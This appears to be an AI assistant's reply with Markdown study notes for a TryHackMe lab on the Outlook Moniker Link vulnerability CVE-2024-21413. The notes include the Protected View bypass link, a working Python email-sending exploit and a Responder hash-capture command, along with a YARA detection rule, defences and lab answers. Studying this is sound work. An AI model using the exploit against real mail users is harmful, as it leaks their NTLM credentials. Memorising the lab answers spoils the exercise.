Got you, Kuya Tyrone üòÑ ‚Äî here‚Äôs a **copy-paste ready Markdown (.md) file** you can directly save as something like:

```
CVE-2024-21413_TryHackMe_Notes.md
```

and open in VS Code.
No emojis, clean formatting, lab-ready, structured for study + review.

---

````md
# CVE-2024-21413 ‚Äî Microsoft Outlook Moniker Link Vulnerability  
**TryHackMe Room Notes**

---

## üìå Overview

- **Vulnerability Name:** Microsoft Outlook RCE & Credential Leak  
- **CVE:** CVE-2024-21413  
- **Nickname:** Moniker Link vulnerability  
- **Discoverer:** Haifei Li (Check Point Research)  
- **Publish Date:** February 13, 2024  
- **Impact:**  
  - Remote Code Execution (RCE)  
  - Credential Leak (NTLM hash)  
- **Severity:** Critical  
- **CVSS Score:** 9.8  
- **Attack Complexity:** Low  
- **Microsoft Advisory:**  
  https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413  

---

## üì¶ Affected Versions

| Product | Version |
|------|--------|
| Microsoft Office LTSC 2021 | affected from 19.0.0 |
| Microsoft 365 Apps for Enterprise | affected from 16.0.1 |
| Microsoft Office 2019 | affected from 16.0.1 |
| Microsoft Office 2016 | affected from 16.0.0 before 16.0.5435.1001 |

---

## üéØ Learning Objectives

- Understand how the vulnerability works  
- Understand Outlook **Protected View**  
- Exploit credential leakage using Moniker Links  
- Learn detection and mitigation techniques  

---

# üß† Technical Concepts

## Outlook HTML Rendering
Outlook can:
- Render HTML emails
- Parse hyperlinks (`http://`, `https://`)
- Open **Moniker Links** (links that call applications or system handlers)

---

## üîê Outlook Protected View

Protected View:
- Opens risky emails in **read-only mode**
- Blocks:
  - External apps
  - Macros
  - External file access
  - Unsafe hyperlinks
- Triggered when Outlook tries to open external resources

---

# üîó Moniker Links

### Normal file link:
```html
<a href="file://ATTACKER_IP/test">Click me</a>
````

This is normally blocked by Protected View.

---

## ‚ùó Vulnerability Bypass

### Bypass format:

```html
<a href="file://ATTACKER_IP/test!exploit">Click me</a>
```

### Key points:

* Uses `file://` Moniker Link
* Uses special character: `!`
* Bypasses Outlook Protected View
* Forces SMB authentication
* Sends victim's NTLM credentials automatically

---

## üß¨ What Gets Leaked?

* Windows authentication over SMB
* Victim sends **netNTLMv2 hash**
* Share does NOT need to exist
* Authentication attempt happens anyway

---

# ‚öîÔ∏è Exploitation Flow

1. Attacker sends email with malicious Moniker Link
2. Victim clicks link
3. Outlook bypasses Protected View
4. SMB authentication triggered
5. Victim sends **netNTLMv2 hash**
6. Attacker captures hash

---

# üß™ Proof of Concept (PoC)

## exploit.py

```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm'
receiver_email = 'victim@monikerlink.thm'
password = input("Enter your attacker email password: ")

html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()

try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

---

## üîß Required Modifications

```text
1. Replace ATTACKER_MACHINE with AttackBox IP
2. Replace MAILSERVER with MACHINE_IP
3. Password for attacker@monikerlink.thm = attacker
```

---

# üì° Hash Capture

## Tool Used:

```bash
responder -I ens5
```

### Purpose:

* Creates SMB listener
* Captures NTLM authentication
* Extracts netNTLMv2 hashes

---

## Captured Data

* **Hash Type:** netNTLMv2
* **Protocol:** SMB
* **Attack Type:** Credential harvesting

---

# üõ°Ô∏è Detection

## YARA Rule (Florian Roth)

```yara
rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {

   meta:
      description = "Detects emails that contain signs of a method to exploit CVE-2024-21413 in Microsoft Outlook"
      author = "X__Junior, Florian Roth"
      reference = "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/"
      date = "2024-02-17"
      modified = "2024-02-19"
      score = 75

   strings:
      $a1 = "Subject: "
      $a2 = "Received: "

      $xr1 = /file:\/\/\/\\\\[^"']{6,600}\.(docx|txt|pdf|xlsx|pptx|odt|etc|jpg|png|gif|bmp|tiff|svg|mp4|avi|mov|wmv|flv|mkv|mp3|wav|aac|flac|ogg|wma|exe|msi|bat|cmd|ps1|zip|rar|7z|targz|iso|dll|sys|ini|cfg|reg|html|css|java|py|c|cpp|db|sql|mdb|accdb|sqlite|eml|pst|ost|mbox|htm|php|asp|jsp|xml|ttf|otf|woff|woff2|rtf|chm|hta|js|lnk|vbe|vbs|wsf|xls|xlsm|xltm|xlt|doc|docm|dot|dotm)!/

   condition:
      filesize < 1000KB
      and all of ($a*)
      and 1 of ($xr*)
}
```

---

# üì° Network Detection

## Wireshark

* SMB authentication traffic visible
* Truncated **netNTLMv2 hash**
* Outbound SMB connection from victim to attacker

---

# üßæ Key Exam/Lab Answers

```text
Severity: Critical
Moniker Link Type: file://
Protected View Bypass Character: !
AttackBox Tool: responder
Captured Hash Type: netNTLMv2
```

---

# üß† Security Summary

* Email alone can trigger credential leakage
* No attachment required
* No exploit file required
* One click = credential compromise
* Works via protocol abuse (SMB + COM + Moniker Links)

---

# üõ†Ô∏è Defensive Takeaways

* Patch Outlook immediately
* Disable NTLM where possible
* Block outbound SMB
* Email filtering for `file://` links
* YARA scanning on mail gateways
* Network monitoring for SMB anomalies

---

# üìö Keywords for Review

```
CVE-2024-21413
Moniker Link
file://
Protected View bypass
NTLM
netNTLMv2
SMB authentication
Responder
Credential harvesting
Outlook exploitation
```

---

```


